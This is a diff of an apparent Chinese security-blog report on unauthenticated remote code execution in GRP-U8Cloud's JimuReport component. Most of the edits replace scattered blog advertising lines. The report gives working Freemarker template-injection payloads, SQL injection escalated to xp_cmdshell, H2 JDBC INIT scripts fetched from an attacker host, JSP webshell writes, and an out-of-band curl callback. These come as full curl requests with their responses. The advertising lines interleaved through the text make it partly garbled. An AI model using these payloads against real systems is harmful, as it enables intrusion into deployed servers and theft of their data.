@@ -12,7 +12,7 @@ asset_dir: embedded-base64
 > **目标操作系统**：Windows（`cmd /c` 命令已验证；Tomcat 工作目录 `C:\GRP-U8Cloud\U8\AppServer`）  
 > **工具地址**: <https://github.com/Mr-xn/fmfuzz_tool>
 >
-> Java（编程语言）
+> 预约渗透测试
 
 ---
 
@@ -20,15 +20,15 @@ asset_dir: embedded-base64
 
 深入探索
 
-data
+获取博客建站工具
 
-计算机科学
+查找自动化脚本
 
-脚本语言
+internet
 
 JimuReport（积木报表）是 JeecgBoot 生态的报表组件，GRP-U8Cloud 将其以 `jimureport-spring-boot-starter-1.4.0.jar` 形式集成。该版本存在 **Freemarker 模板注入漏洞**：
 
-1. 用户可控输入（`sql` 参数 / `dbDynSql` [数据](#)库模板字段）被拼入 Freemarker 模板；
+1. 用户可控输入（`sql` 参数 / `dbDynSql` 数据库模板字段）被拼入 Freemarker 模板；
 2. 渲染时 `Configuration.setClassicCompatible(true)` 且 **未做任何危险类过滤**（无沙箱）；
 3. 攻击者可通过 `?new()` 内置函数实例化 `freemarker.template.utility.Execute` 或 `ObjectConstructor`（可构造任意对象，包括 `java.lang.ProcessBuilder`）实现 **[任意命令执行](https://mrxn.net/tag/rce "标签：任意命令执行")**。
 
@@ -44,15 +44,13 @@ JimuReport（积木报表）是 JeecgBoot 生态的报表组件，GRP-U8Cloud �
 
 深入探索
 
-网络安全
+Blog
 
-DATA
+预约安全审计
 
-Database
+blog
 
 以下代码均反编译自 `webapps/WEB-INF/lib/jimureport-spring-boot-starter-1.4.0.jar`（类经过混淆，方法名为单字母）。
-
-C 与 C++
 
 ## 2.1 渲染链核心：FreeMarkerUtils
 
@@ -90,7 +88,7 @@ public static String a(String string, Map<String, Object> map) {
 
 `?new()` 即 `freemarker.template.utility.ObjectConstructor`（FreeMarker 2.3.x 内建），可构造**任意有 public 构造器的类**——本报告中用它实例化 `freemarker.template.utility.Execute`（字符串参数[命令执行](https://mrxn.net/tag/rce "标签：命令执行")）与 `java.lang.ProcessBuilder`（进程数组启动）。
 
-计算机安全
+预约渗透测试
 
 ## 2.2 直传型入口：queryFieldBySql / loadTableData
 
@@ -110,8 +108,6 @@ public Result<?> a(@RequestBody JSONObject jSONObject) {
 
 Service 实现 `org.jeecg.modules.jmreport.desreport.service.a.i`（parseReportSql 反编译片段，来自实测输出回显的堆栈类）：
 
-黑客与破解
-
 ```
 public Map<String, Object> parseReportSql(String sql, String dbKey, Object paramArray, String type) {
     ...
@@ -120,7 +116,7 @@ public Map<String, Object> parseReportSql(String sql, String dbKey, Object param
 }
 ```
 
-`util.e` 类中该渲染方法的字节码（[java](#)p 确认）：
+`util.e` 类中该渲染方法的字节码（javap 确认）：
 
 ```
 // 遍历 paramArray，paramValue 交给 Aviator 表达式引擎 express.b.a 求值
@@ -132,8 +128,6 @@ public Map<String, Object> parseReportSql(String sql, String dbKey, Object param
 ```
 
 `/jmreport/loadTableData` 与 `/jmreport/queryFieldBySql` 最终都走到 `e.a(sql, paramArray)` → `FreeMarkerUtils.a(sql, map)`。实测两个入口均确认模板执行。
-
-编程
 
 ## 2.3 库表型入口：getBaseSql 渲染 dbDynSql
 
@@ -157,10 +151,8 @@ public Map<String, Object> parseReportSql(String sql, String dbKey, Object param
 
 `saveDb` 与 `save` 端点均标注了 `@JimuLoginRequired`，但该注解**没有任何生效的拦截器实现**——实测不带任何 Cookie / Authorization 头直接调用即返回成功写入。这意味着攻击面从"需要先拿到一个合法报表 id 才能利用"升级为：
 
-软件实用程序
-
 1. 攻击者无凭证即可 `saveDb` 写入任意 `dbDynSql` 模板；
-2. 无凭证即可 `save` 创建/更新报表，把[数据](#)集绑定到报表；
+2. 无凭证即可 `save` 创建/更新报表，把数据集绑定到报表；
 3. 无凭证即可调用 `show` / `exportAllExcel` / `exportPdf` 触发渲染[执行命令](https://mrxn.net/tag/rce "标签：执行命令")。
 
 `saveReport` 的语义（字节码确认）：JSON 顶层字段 `excel_config_id` 指定要更新的报表 id；`jsonStr` 保存为移除 `designerObj` 之后的整个 JSON。**本测试中 `{"id":""}` 的 naive 调用会创建一条 `jsonStr=null` 的垃圾报表**（后续 show 时 NPE 500），正确用法必须带 `excel_config_id`。
@@ -171,7 +163,7 @@ public Map<String, Object> parseReportSql(String sql, String dbKey, Object param
 
 `queryFieldBySql` 的 `paramArray` 字段（JSON 数组）沿以下链路进入表达式引擎：
 
-Java（编程语言）
+预约渗透测试
 
 ```
 POST /jmreport/queryFieldBySql
@@ -195,8 +187,6 @@ controller a.a(JSONObject)            paramArray = jSONObject.get("paramArray")
 
 关键事实：
 
-数据管理
-
 1. **`express.b.a(String, Map)` 的执行条件**（反编译）：paramValue `trim()` 后以 `=` 开头即  
    `compile(expr).execute(new HashMap())`（**注意是 `replace("=", "")` 替换全部等号**，表达式中  
    的 `==` 会被破坏；非 `=` 前缀原样返回）
@@ -210,7 +200,7 @@ controller a.a(JSONObject)            paramArray = jSONObject.get("paramArray")
 
 用 WEB-INF/lib 真实 `aviator-4.2.6.jar` 编译执行验证（/tmp/AviTest\* 系列，全部无害表达式）：
 
-字典与百科全书
+预约渗透测试
 
 | 表达式形态 | 结果 | 说明 |
 | --- | --- | --- |
@@ -230,8 +220,6 @@ controller a.a(JSONObject)            paramArray = jSONObject.get("paramArray")
 **不可能触达任意 [Java](https://mrxn.net/tag/Java "标签：Java") 类方法**。结论：**paramArray→Aviator 为表达式求值级注入（任意算术/内置  
 函数），无命令执行、无反射、无文件/网络操作能力**，影响显著低于 freemarker SSTI 主链。
 
-C 与 C++
-
 ### 2.5.3 附加发现
 
 - **A. 主渲染点定位**：§2.1 渲染链的调用方确认是 `util.e.a(String, Map, Object)` 3 参版本  
@@ -241,13 +229,13 @@ C 与 C++
   进 sql 并由 JDBC 真实执行**（绕过 SqlInjectionUtil.specialFilterContentForOnlineReport——过滤对象  
   是 sql 原文，paramValue 在过滤后注入）。实测要点与证据：
 
-  编程
+  报名编程课程
 
   - **paramArray 请求结构（实测发现）**：目标端必须传 **JSON 字符串**形态  
     `"paramArray": "[{\"paramName\":\"p\",\"paramValue\":\"...\"}]"`；直接传数组对象  
     `[{"paramName":...}]` 报 `expect ':' at 0`（500，fastjson 解析异常），传对象形态报  
     `syntax error, expect [, actual {`
-  - **[数据](#)库确认：SQL Server**（报错泄漏 `com.microsoft.sqlserver.jdbc.SQLServerException`；  
+  - **数据库确认：SQL Server**（报错泄漏 `com.microsoft.sqlserver.jdbc.SQLServerException`；  
     注入 `--` 注释生效而 `#` 注释失败）
   - **字段名回显（queryFieldBySql，无鉴权）**：paramValue `1' as inj --` → 最终  
     `select '1' as inj --' as val` → 响应 fieldList 列名由 val 变为 **inj**
@@ -293,13 +281,13 @@ C 与 C++
     以最后一步 xp\_cmdshell 的输出判断是否开启成功。开启为持久服务器配置变更，仅限授权测试环境
   - **通用性**：`call sp_who()` 对照同样成功（完整回显会话列表）——**任意存储过程执行 + 结果  
     回显**的通用通道，`call xp_cmdshell('<任意命令>')` 即系统命令执行，输出回显
-  - [数据](#)库连接账号 `sa`（sp\_who 输出 loginame=sa，sysadmin 角色）→ xp\_cmdshell 权限完整；  
+  - 数据库连接账号 `sa`（sp\_who 输出 loginame=sa，sysadmin 角色）→ xp\_cmdshell 权限完整；  
     本次仅执行只读 whoami 证明，未执行其他命令
 - **D. HTTP raw 报文实录（完整无省略， 目标实测）**：以下请求报文与响应均为测试环境  
   完整实录——请求体即线上字节（JSON 接口原样展示；表单接口展示 urlencoded 后字节），响应为  
   完整 JSON 未截断。表单字段顺序：dbSource/sql/paramArray/tableName/pageNo/pageSize。
 
-  Java（编程语言）
+  预约渗透测试
 
   1) **queryFieldBySql 字段名回显**（paramValue `1' as inj --`，列名 val→inj）：
 
@@ -333,7 +321,7 @@ C 与 C++
 
   3) **loadTableData 表名读取**（sysobjects xtype='U'，GRP-U8 账套库业务表）：
 
-  计算机安全
+  报名编程课程
 
   ```
   POST /jmreport/loadTableData HTTP/1.1
@@ -365,8 +353,6 @@ C 与 C++
 
   5) **loadTableData 堆叠探测**（`;` 多语句，报错泄漏分页包装 SQL——堆叠不支持证据）：
 
-  软件实用程序
-
   ```
   POST /jmreport/loadTableData HTTP/1.1
   Host: 192.168.168.168:8088
@@ -397,8 +383,6 @@ C 与 C++
 
   7) **loadTableData call 通道——sp\_configure 开启步骤**（无结果集报错属预期，配置已执行）：
 
-  数据管理
-
   ```
   POST /jmreport/loadTableData HTTP/1.1
   Host: 192.168.168.168:8088
@@ -421,8 +405,6 @@ C 与 C++
 工具 `fmfuzz.jar --param-avi EXPR` 生成成品 → fastjson 1.2.83 解析 → aviator 4.2.6 真实求值 →  
 替换 `${p}` → freemarker 2.3.31 渲染（/tmp/E2E.[Java](https://mrxn.net/tag/Java "标签：Java")），全部命中：
 
-编程
-
 ```
 --param-avi '1+1'                                → 最终 sql: select '2' as val
 --param-avi '1+1' -J -j 1（全\u 转义形态）         → 最终 sql: select '2' as val
@@ -438,9 +420,7 @@ FreeMarkerUtilsAviator 引擎util.e 工具类queryFieldBySql 控制器攻击者F
 
 ### 2.6.1 反编译确认的接口与连接链
 
-`DesignReportController`（混淆名 `a` 类，`/jmreport` 前缀）中存在**无鉴权**[数据](#)源测试连接接口：
-
-字典与百科全书
+`DesignReportController`（混淆名 `a` 类，`/jmreport` 前缀）中存在**无鉴权**数据源测试连接接口：
 
 ```
 @PostMapping(value={"/testConnection"})              // 无 @JimuLoginRequired、无 HttpServletRequest
@@ -474,12 +454,10 @@ public Result a(@RequestBody JmreportDynamicDataSourceVo vo) {
 
 classpath 全部 JDBC 驱动（均可被任意调用，`WEB-INF/lib` 清单）：
 
-计算机安全
-
 | 驱动 | jar | 可利用面 |
 | --- | --- | --- |
-| **H2** | h2-2.2.224.jar | **INIT 通道：连接阶段执行任意 SQL/[Java](#)（实测，见 2.6.3）** |
-| MySQL | mysql-connector-[java](#)-8.0.25.jar | 出站 TCP + 认证（SSRF）；autoDeserialize 需查询触发，此接口不可用 |
+| **H2** | h2-2.2.224.jar | **INIT 通道：连接阶段执行任意 SQL/Java（实测，见 2.6.3）** |
+| MySQL | mysql-connector-java-8.0.25.jar | 出站 TCP + 认证（SSRF）；autoDeserialize 需查询触发，此接口不可用 |
 | jTDS | jtds-1.3.1.jar | 出站 TCP（SSRF） |
 | SQL Server | sqljdbc4-4.1.jar | 出站 TCP（SSRF） |
 | Oracle | ojdbc6-11.2.0.jar | 出站 TCP（SSRF） |
@@ -493,14 +471,14 @@ NoSQL 分支（dbType 含 `redis`/`mongodb` 关键字即进入 `JmreportNoSqlUti
   String/int/SSL 系），jmreport 按更高版本 jedis 编译 → 运行期 `NoSuchMethodError`（Error 子类  
   **逃逸 `catch(Exception)`**）→ 全局 500 "服务器出错，请重试"；**出站永不发生，Redis 面实际不可利用**
 - **MongoDB**：`new MongoClient(host:port)` + SCRAM-SHA-1 认证握手，`connectTimeout(3)` 毫秒  
-  硬编码 → 实测返回"[数据](#)库连接失败：错误未知"（API 匹配、异常正常捕获）；3ms 超时出站几乎不可达
+  硬编码 → 实测返回"数据库连接失败：错误未知"（API 匹配、异常正常捕获）；3ms 超时出站几乎不可达
 
 ### 2.6.2 JNDI 面结论（代码级）
 
 - `DriverManager.getConnection` 本身不支持 `jdbc:jndi:` 协议；classpath **无 commons-dbcp /  
   tomcat-jdbc** → DBCP/Tomcat 的 JNDI 数据源协议不可用
 - **实际的"JNDI 级"面 = H2 引擎内任意 SQL/Java 执行**（INIT 通道，见 2.6.3）：  
-  远程脚本执行（RUNSCRIPT FROM http）、内联 [Java](#) 源码编译（CREATE ALIAS）、任意静态方法引用  
+  远程脚本执行（RUNSCRIPT FROM http）、内联 Java 源码编译（CREATE ALIAS）、任意静态方法引用  
   （CREATE ALIAS FOR 类.方法）、任意路径文件创建（file 模式）
 - MySQL 8.0.25 的 autoDeserialize/queryInterceptors [反序列化](https://mrxn.net/tag/rce "标签：反序列化")链需要**连接后执行 SELECT**  
   触发，本接口仅建连即 close → 不可用
@@ -512,13 +490,13 @@ NoSQL 分支（dbType 含 `redis`/`mongodb` 关键字即进入 `JmreportNoSqlUti
 | 1 | 无鉴权 | 无任何 token 直调 | `{"success":false,"message":"数据库连接失败：驱动类不存在",...}` ——业务响应非 401 ✓ |
 | 2 | 驱动类加载 | `dbDriver=com.nonexist.DriverX` | 回显"驱动类不存在" → `Class.forName(dbDriver)` 确认执行 + 错误回显 ✓ |
 | 3 | **SSRF + 远程 SQL 脚本执行** | `dbDriver=org.h2.Driver`，`dbUrl=jdbc:h2:mem:fmvprobe;INIT=RUNSCRIPT FROM 'http://192.168.168.167:8001/init.sql'`（脚本内容：`CREATE ALIAS IF NOT EXISTS FMV_PROBE FOR 'java.lang.System.getProperty';`，纯定义无副作用） | 攻击机监听日志 `192.168.168.168 GET /init.sql 200` + 返回"数据库连接成功"——**INIT 在连接阶段执行了攻击机可控的远程 SQL 脚本** ✓ |
-| 4 | **H2 内联 Java 源码编译（RCE 链关键环节）** | init2.sql 内容：`CREATE ALIAS IF NOT EXISTS FMV_COMPILE AS 'String fmvCompile(){ return "FMV-COMPILE-OK"; }';` | 目标 GET /init2.sql 200 + 连接成功（Java 源码**编译通过**）→ 脚本中追加 `CALL <别名>(...)` 即在目标 JVM 内执行任意 Java 代码，**连接建立即触发、无需后续查询**（[java](#)c 由 H2 调 JSR-199 API，Tomcat 进程为 JDK 时可用）✓ |
+| 4 | **H2 内联 Java 源码编译（RCE 链关键环节）** | init2.sql 内容：`CREATE ALIAS IF NOT EXISTS FMV_COMPILE AS 'String fmvCompile(){ return "FMV-COMPILE-OK"; }';` | 目标 GET /init2.sql 200 + 连接成功（Java 源码**编译通过**）→ 脚本中追加 `CALL <别名>(...)` 即在目标 JVM 内执行任意 Java 代码，**连接建立即触发、无需后续查询**（javac 由 H2 调 JSR-199 API，Tomcat 进程为 JDK 时可用）✓ |
 | 5 | **任意路径文件创建** | `dbUrl=jdbc:h2:file:../U8System/Tomcat/webapps/fmvprobe`（工作目录相对路径，与既知 io-write 链同目录） | 连接成功 → `http://192.168.168.168:8088/fmvprobe.mv.db` **HTTP 200，16,384 字节**——无鉴权在 webapps 下创建文件 ✓ |
 | 6 | INIT 对照（证明 INIT 真实执行） | `dbUrl=...;INIT=THIS IS NOT VALID SQL` | 回显 H2 语法错误 `[42001-224]`——INIT 内容被真实解析执行 ✓ |
 | 7 | Redis 分支 | `dbType=redis`，dbUrl 指向攻击机监听 6390 | 0.015s 内返回全局 500；攻击机 30s 无任何连接——NoSuchMethodError 确认（2.6.1），出站不发生 ✓（负面证据） |
-| 8 | MongoDB 分支 | `dbType=mongodb`，dbUrl 指向攻击机 6391 | 返回"[数据](#)库连接失败：错误未知"，0.013s 即失败（connectTimeout=3ms）✓（负面证据） |
+| 8 | MongoDB 分支 | `dbType=mongodb`，dbUrl 指向攻击机 6391 | 返回"数据库连接失败：错误未知"，0.013s 即失败（connectTimeout=3ms）✓（负面证据） |
 | 9 | **后缀控制（H2 直写模式，负面）** | `dbUrl=jdbc:h2:file:../U8System/Tomcat/webapps/fmvprobe2.jsp` | 实际生成 `fmvprobe2.jsp.mv.db`（16KB，头 `H:2,bloc` = H2 MVStore magic），URL `/fmvprobe2.jsp` 404 → **H2 直写自动追加 `.mv.db` 且内容为数据库格式，无法直接产出可执行 JSP** |
-| 10 | **[Java](#) 写文件通道：任意后缀 + 任意内容（RCE 链完整落地）** | 脚本内 `CREATE ALIAS ... AS 'Java源码'` + `CALL`，Java 代码 `Files.write` 写入 `webapps/fmvprobe.jsp`，内容 `<%out.print("FMV-JSP-OK");%>` | HTTP 访问返回 **`FMV-JSP-OK`（10 字节，即 JSP 执行结果而非源码原文）——Tomcat 真实编译执行了新写入的 JSP** ✓；后缀、内容、目标目录 100% 可控 |
+| 10 | **Java 写文件通道：任意后缀 + 任意内容（RCE 链完整落地）** | 脚本内 `CREATE ALIAS ... AS 'Java源码'` + `CALL`，Java 代码 `Files.write` 写入 `webapps/fmvprobe.jsp`，内容 `<%out.print("FMV-JSP-OK");%>` | HTTP 访问返回 **`FMV-JSP-OK`（10 字节，即 JSP 执行结果而非源码原文）——Tomcat 真实编译执行了新写入的 JSP** ✓；后缀、内容、目标目录 100% 可控 |
 | 11 | **WEB-INF 目录可写** | 同通道写 `webapps/WEB-INF/fmvprobe_webinf.txt`（13 字节） | 写后 Java 读回文件大小并抛异常，回显 **`FMV-WEBINF-WRITTEN:13`** → WEB-INF 可写 ✓（Tomcat 保护 /WEB-INF 不可 HTTP 直读，故用写后读回 + 异常回显确认） |
 | 12 | **目录不存在时自动创建** | `dbUrl=jdbc:h2:file:../U8System/Tomcat/webapps/fmvprobe_dir_auto/sub/test`（两级目录均不存在） | 连接成功 + `test.mv.db` HTTP 200 → **H2 自动递归创建不存在的父目录** ✓（对应 H2 `Database.open` 中 createDirectories 逻辑）；Java `Files.write` 通道本身不建目录，但 Java 代码可先 `createDirectories`，同样可控 |
 
@@ -529,9 +507,9 @@ NoSQL 分支（dbType 含 `redis`/`mongodb` 关键字即进入 `JmreportNoSqlUti
 以下请求报文与响应均为测试环境完整实录——请求体即线上字节，响应为完整 JSON 未截断。  
 攻击机 HTTP 服务监听于 `192.168.168.167:8001`，目标 `192.168.168.168:8088`。
 
-**1) JSP 写入与执行（[Java](#) 写文件通道，对应证据 #10）**
+**1) JSP 写入与执行（Java 写文件通道，对应证据 #10）**
 
-软件实用程序
+报名编程课程
 
 攻击机 `write.sql` 内容（含内联 Java 源码定义 + CALL 执行）：
 
@@ -554,8 +532,6 @@ Content-Length: 174
 ```
 
 随后访问新写入的 JSP（Tomcat 编译执行，返回的是执行结果 10 字节而非源码原文 45 字节）：
-
-Java（编程语言）
 
 ```
 GET /fmvprobe.jsp HTTP/1.1
@@ -586,9 +562,7 @@ Content-Length: 146
 ```
 
 文件确认——URL `/fmvprobe2.jsp` 404；实际生成 `fmvprobe2.jsp.mv.db`（H2 自动追加 `.mv.db`），  
-内容为 H2 [数据](#)库格式（MVStore 文件头）而非 JSP 内容：
-
-编程
+内容为 H2 数据库格式（MVStore 文件头）而非 JSP 内容：
 
 ```
 HTTP/1.1 200
@@ -614,8 +588,6 @@ Content-Length: 159
 返回 HTTP 200（16384B，与 2) 相同的 octet-stream 特征）——两级不存在的目录 `fmvprobe_dir_auto/sub/`  
 被 H2 建库时递归自动创建。
 
-数据管理
-
 **4) WEB-INF 目录写入（对应证据 #11）**
 
 攻击机 `write3.sql` 内容（写后 Java 读回文件大小并抛异常，经异常回显确认）：
@@ -639,8 +611,6 @@ Content-Length: 169
 ```
 
 （写入行为成功；`CALL` 抛异常导致连接阶段失败，但文件已落盘，错误回显即确认手段）
-
-字典与百科全书
 
 **5) 痕迹清理（cleanup，删除本轮全部测试文件）**
 
@@ -667,9 +637,9 @@ Content-Length: 171
 清理后复验：`/fmvprobe.jsp`、`/fmvprobe2.jsp.mv.db`、`/fmvprobe_dir_auto/sub/test.mv.db` 全部  
 HTTP 404——目标侧无测试痕迹残留。
 
-计算机安全
-
 **6) SSRF + 远程 SQL 脚本执行（CREATE ALIAS FOR 静态方法引用形态，对应证据 #3）**
+
+报名编程课程
 
 攻击机 `init.sql` 内容（纯定义、无副作用，仅注册别名指向既有静态方法）：
 
@@ -692,15 +662,13 @@ Content-Length: 169
 
 攻击机监听日志（目标出站拉取脚本，SSRF 确认）：
 
-Java（编程语言）
-
 ```
 192.168.168.168 - - [09/Aug/2026 14:55:06] "GET /init.sql HTTP/1.1" 200 -
 ```
 
-**7) H2 内联 [Java](#) 源码编译通道（CREATE ALIAS AS 源码形态，对应证据 #4）**
+**7) H2 内联 Java 源码编译通道（CREATE ALIAS AS 源码形态，对应证据 #4）**
 
-攻击机 `init2.sql` 内容（Java 源码作为别名方法体，由 H2 经 JSR-199 调用 [java](#)c 编译）：
+攻击机 `init2.sql` 内容（Java 源码作为别名方法体，由 H2 经 JSR-199 调用 javac 编译）：
 
 ```
 CREATE ALIAS IF NOT EXISTS FMV_COMPILE AS 'String fmvCompile(){ return "FMV-COMPILE-OK"; }';
@@ -721,8 +689,6 @@ Content-Length: 170
 
 攻击机监听日志：
 
-编程
-
 ```
 192.168.168.168 - - [09/Aug/2026 14:55:06] "GET /init2.sql HTTP/1.1" 200 -
 ```
@@ -741,15 +707,15 @@ Content-Length: 170
 5. **任意类加载**：`Class.forName(dbDriver)` 触发任意类的静态初始化
 
 > 约束声明：以上验证全部采用无害形态（脚本仅 CREATE ALIAS 定义、未 CALL 执行命令；文件写仅  
-> 新建 fmvprobe 探测库未触碰既有文件），未读取任何账务[数据](#)、未执行任何破坏性操作。
+> 新建 fmvprobe 探测库未触碰既有文件），未读取任何账务数据、未执行任何破坏性操作。
+>
+> 报名编程课程
 
 ---
 
 # 3. 攻击面：DesignReportController 全入口分析
 
 控制器 `a` 类（`/jmreport` 前缀）全部入口梳理如下（反编译 + 实测）：
-
-软件实用程序
 
 | 入口 | 方法/参数 | 是否走模板链 | 鉴权 | 实测结论 |
 | --- | --- | --- | --- | --- |
@@ -760,7 +726,7 @@ Content-Length: 170
 | `POST /exportPdf` | `excelConfigId`（JSON） | ✅ 是（`getBaseSql` → FreeMarkerUtils） | 无 | **RCE 实证**（4.5，需先写库） |
 | `POST /saveDb` | `JmReportDb`（JSON，含 `dbDynSql`） | 写库（不渲染） | **标注 @JimuLoginRequired 但实际无校验** | **无鉴权可写**（4.3） |
 | `POST /save` | `excel_config_id` + designerObj | 写库（不渲染） | 同上 | **无鉴权可更新报表**（4.3） |
-| `POST /queryFieldByBean` | `javaType` / `javaValue` | ❌ 否（[java](#)bean 反射面，非模板） | 无 | 排除：连 `select 1 as val` 也 500；参数根本不是 sql（4.6） |
+| `POST /queryFieldByBean` | `javaType` / `javaValue` | ❌ 否（javabean 反射面，非模板） | 无 | 排除：连 `select 1 as val` 也 500；参数根本不是 sql（4.6） |
 | `GET /loadTable` | `dbSource` | ❌ 否（仅元数据查询） | 无 | 排除（4.6） |
 | `GET /getCharData` | `reportId`,`charId` | ❌ 否（仅解析 chartList 图表配置） | 无 | 排除（上轮会话已测） |
 | `GET /print` | 静态 `print.ftl` 页面壳 | ❌ 否 | 无 | 排除 |
@@ -772,7 +738,7 @@ Content-Length: 170
 | `GET /checkParam/{id}` | 报表参数查询 | ❌ 否（元数据） | 无 | 用于报表存在性探测（200/404） |
 | `GET /get/{id}`、`/getReportByUser`、`/list` 等 | 元数据读取 | ❌ 否 | 无 | 信息探测面：可枚举报表 |
 
-**关键洞察**：`queryFieldByBean` 曾经被误判为候选入口（500 响应），反编译后确认其参数为 `javaType`/`javaValue`（javabean [数据](#)工厂反射面）而非 SQL，**同一 URL 名字带 "Field" 但走的完全是另一条链**。真正需要关注的候选必须满足：参数能进入 `FreeMarkerUtils.a()` 渲染。
+**关键洞察**：`queryFieldByBean` 曾经被误判为候选入口（500 响应），反编译后确认其参数为 `javaType`/`javaValue`（javabean 数据工厂反射面）而非 SQL，**同一 URL 名字带 "Field" 但走的完全是另一条链**。真正需要关注的候选必须满足：参数能进入 `FreeMarkerUtils.a()` 渲染。
 
 ---
 
@@ -780,7 +746,7 @@ Content-Length: 170
 
 > 以下报文为测试全过程的原始 curl 命令与响应，未做任何省略。响应时间戳为服务器端（UTC+8 时间戳毫秒）。
 >
-> 编程
+> 预约渗透测试
 
 ## 4.1 queryFieldBySql 系列
 
@@ -812,7 +778,7 @@ curl -s --max-time 20 -X POST "http://192.168.168.168:8088/jmreport/queryFieldBy
 
 说明：模板成功执行（无模板语法错误），输出 `123` 非合法 SQL 故"解析失败"。
 
-计算机安全
+报名编程课程
 
 ### 测试4：select 包装——验证模板值注入 SQL
 
@@ -837,8 +803,6 @@ curl -s --max-time 30 -X POST "http://192.168.168.168:8088/jmreport/queryFieldBy
 ```
 
 说明：模板被处理（输出为 `id` 命令结果拼入 SQL 双引号字符串），返回解析成功。Execute 类可[执行任意命令](https://mrxn.net/tag/rce "标签：执行任意命令")，命令输出会进入 SQL 文本。
-
-字典与百科全书
 
 ### ObjectConstructor + ProcessBuilder：waitFor() 阻塞计时验证 RCE ★
 
@@ -869,7 +833,7 @@ time curl -s --max-time 10 -X POST "http://192.168.168.168:8088/jmreport/queryFi
 
 **2.758s vs 0.380s —— 相差 2.4 秒，与 ping -n 3 的期望耗时吻合，进程确实被创建并等待完成。RCE 确认。**
 
-Java（编程语言）
+预约渗透测试
 
 ### 命令输出外带尝试（OOB，DNS 出网受限）
 
@@ -900,8 +864,6 @@ sleep 5; curl -s -X POST "https://callback.red/" -d "key=8fec6f7d-0456-45ba-9546
 
 说明：DNS 日志为空。结合后续写文件验证成功，判定为目标环境 **DNS 出网受限**（并非命令未执行），故改用**写文件 + HTTP 访问**作为带内验证手段。
 
-编程
-
 ### 写文件验证（相对路径穿越）
 
 ```
@@ -921,8 +883,6 @@ curl -s --max-time 10 "http://192.168.168.168:8088/shell1.jsp?cmd=whoami" | head
 ```
 
 说明：命令执行成功（解析成功），但 CWD 是 `AppServer` 目录而非 `webapps`，`shell1.jsp` 写在非 Web 可达目录。随后使用相对路径穿越 `..\U8System\Tomcat\webapps\`（实测 r7.png 等文件均落盘成功，见 4.2 起各节），确认 **Tomcat webapps 根位于 `CWD 上溯一级`**：payload 仅用一级 `..\` 即从 `C:\GRP-U8Cloud\U8\AppServer` 上溯到 `C:\GRP-U8Cloud\U8`，再进入 `U8System\Tomcat\webapps`，即 `C:\GRP-U8Cloud\U8\AppServer\..\U8System\Tomcat\webapps`。`java.io.File` 获取 CWD 的测试与本结论一致。
-
-C 与 C++
 
 ---
 
@@ -977,7 +937,7 @@ curl -s -X POST 'http://192.168.168.168:8088/jmreport/loadTableData' --data-urle
 
 说明：纯 SQL 无模板同样 500（SQL 执行环境问题：无 FROM 或执行上下文受限），**与模板执行无关**——这解释了为何所有模板 payload 的 HTTP 状态都是 500，必须用**副作用（文件/计时）**判定 RCE。
 
-软件实用程序
+报名编程课程
 
 ### 早期 OOB 尝试（loadTableData 入口，sql1.txt）
 
@@ -999,7 +959,7 @@ select '<#assign p="freemarker.template.utility.ObjectConstructor"?new()>${p("cm
 
 > 核心发现：**saveDb 与 save 均无鉴权**（标注 `@JimuLoginRequired` 但无拦截器生效）。
 
-### 4.3.1 saveDb 写入恶意[数据](#)集（r9ds，指向 r9.png）
+### 4.3.1 saveDb 写入恶意数据集（r9ds，指向 r9.png）
 
 ```
 python3 -c "
@@ -1027,7 +987,7 @@ curl -s -X POST 'http://192.168.168.168:8088/jmreport/saveDb' -H 'Content-Type: 
 
 第一次 naive 调用 `{"id":""}` 创建了 `jsonStr=null` 的垃圾报表：
 
-计算机安全
+预约渗透测试
 
 ```
 curl -s -X POST 'http://192.168.168.168:8088/jmreport/save' -H 'Content-Type: application/json' -d '{"id":""}'
@@ -1083,9 +1043,9 @@ r9.png HTTP 200
 
 **`show` 返回 500 但 r9.png 落盘成功（HTTP 200）——show 链 RCE 实证**。500 是模板执行完成后真实 SQL 执行失败的预期表现。
 
-C 与 C++
-
 前置探测记录（show 链可行性确认）：
+
+报名编程课程
 
 ```
 curl -s -m 10 -o /dev/null -w 'connect %{http_code} time %{time_total}s\n' 'http://192.168.168.168:8088/jmreport/checkParam/1'
@@ -1137,7 +1097,7 @@ cat /tmp/exp10.bin
 {"timestamp":"T06:11:27.036+0000","status":500,"error":"Internal Server Error","path":"/jmreport/exportAllExcel"}
 ```
 
-**失败原因分析**（反编译 `a.k` JmReportExportExcelImpl）：`exportExcel` 会遍历报表绑定的**全部[数据](#)集**（`getDataById` 循环），第一个数据集 r9ds（旧模板渲染后 SQL 失败）抛异常中断循环，r10ds 尚未执行到。**验证了数据集循环执行顺序**。
+**失败原因分析**（反编译 `a.k` JmReportExportExcelImpl）：`exportExcel` 会遍历报表绑定的**全部数据集**（`getDataById` 循环），第一个数据集 r9ds（旧模板渲染后 SQL 失败）抛异常中断循环，r10ds 尚未执行到。**验证了数据集循环执行顺序**。
 
 ### 4.4.2 更新 r9ds 后成功（r9b.png）
 
@@ -1167,7 +1127,7 @@ r9b.png: 200
 
 **`exportAllExcel` 链 RCE 实证**：saveDb 更新（200）→ exportAllExcel 触发渲染（500，命令已执行）→ r9b.png 落盘（200）。
 
-编程
+报名编程课程
 
 ---
 
@@ -1199,7 +1159,7 @@ r12.png: 200
 
 **`exportPdf` 链 RCE 实证**：同上模式，PDF 导出渲染时执行恶意 dbDynSql，r12.png 落盘。
 
-Java（编程语言）
+预约渗透测试
 
 ---
 
@@ -1215,7 +1175,7 @@ curl -s -X POST 'http://192.168.168.168:8088/jmreport/queryFieldByBean' --data-u
 {"success":false,"message":"javabean数据集需要实现接口IDataSetFactory","code":500,"result":null,...}
 ```
 
-（反编译确认其参数为 `javaType` / `javaValue`，走 `e.c(javaType, javaValue)` [java](#)bean 反射 + `IDataSetFactory` 接口，与模板链无关。）
+（反编译确认其参数为 `javaType` / `javaValue`，走 `e.c(javaType, javaValue)` javabean 反射 + `IDataSetFactory` 接口，与模板链无关。）
 
 ### qurestSql / qurestApi：api 表驱动，排除
 
@@ -1243,8 +1203,6 @@ curl -s -m 15 -X POST 'http://192.168.168.168:8088/jmreport/testConnection' -H '
 
 说明：无鉴权可调用，服务端会尝试建立 JDBC 连接，**异常信息（含驱动解析、连接错误细节）回显在 message 字段**。可用于内网端口扫描（jdbc:mysql://ip:port 的连通性探测）。`dbUrl` 可指向任意内网地址。
 
-软件实用程序
-
 ### view/{id} 页面壳（探测边界说明）
 
 ```
@@ -1261,8 +1219,6 @@ done
 # 5. 混淆方案与变体验证
 
